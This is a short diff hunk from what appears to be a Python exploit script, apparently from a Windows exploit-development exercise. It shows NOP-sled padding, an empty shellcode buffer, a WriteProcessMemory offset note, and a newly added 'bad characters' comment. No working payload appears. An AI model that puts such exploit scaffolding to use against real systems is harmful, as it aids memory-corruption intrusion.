@@ -109,7 +109,7 @@ try:
     padding = b"\x90" * 20
     
     # WPM is offset 000144f0 away from GetCurrentProcess
-    
+    # Bad characters: 0x00
     shellcode = b""
     shellcode += b"\x90" * 500
     
